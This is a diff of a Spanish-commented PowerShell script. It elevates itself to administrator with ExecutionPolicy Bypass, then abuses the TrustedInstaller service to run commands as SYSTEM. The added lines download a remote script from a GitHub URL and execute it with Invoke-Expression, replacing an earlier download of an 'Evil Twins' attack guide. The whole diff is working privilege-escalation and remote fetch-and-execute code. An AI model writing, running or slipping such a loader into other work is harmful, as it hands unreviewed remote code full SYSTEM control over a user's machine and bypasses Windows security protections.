@@ -1,4 +1,10 @@
-# Definir la función Run-Trusted (sin cambios)
+# Verificar si se ejecuta como administrador; si no, relanzar con privilegios elevados
+If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
+  Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
+  Exit
+}
+
+# Definir la función Run-Trusted para ejecutar comandos con privilegios de SYSTEM
 function Run-Trusted([String]$command) {
   Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
   $service = Get-WmiObject -Class Win32_Service -Filter "Name='TrustedInstaller'"
@@ -11,17 +17,16 @@ function Run-Trusted([String]$command) {
   Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
 }
 
-# Comando para descargar el repositorio a C:\Users\Public
-$downloadCommand = @"
-New-Item -Path 'C:\Users\Public' -ItemType Directory -Force
-Set-Location 'C:\Users\Public'
-Invoke-WebRequest -Uri 'https://github.com/Angel-Rojas-ING/Guia-Avanzada-de-Evil-Twins/archive/refs/heads/main.zip' -OutFile 'EvilTwins.zip' -ErrorAction Stop
-Expand-Archive 'EvilTwins.zip' -DestinationPath 'C:\Users\Public' -Force
-Remove-Item 'EvilTwins.zip' -Force
+# Comando para descargar y ejecutar Hello.ps1 con bypass de política
+$executeCommand = @"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "\$scriptContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Angel-Rojas-ING/TEST/refs/heads/main/Hello.ps1' -UseBasicParsing; Invoke-Expression \$scriptContent.Content"
 "@
 
 # Ejecutar el comando con Run-Trusted
-Write-Host 'Downloading Evil Twins Guide to C:\Users\Public...'
-Run-Trusted -command $downloadCommand
-Write-Host 'Download completed!'
+Write-Host 'Downloading and executing Hello.ps1 from GitHub...'
+Run-Trusted -command $executeCommand
+Write-Host 'Execution completed!'
+
+
+
 #usar powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\Mio.ps1
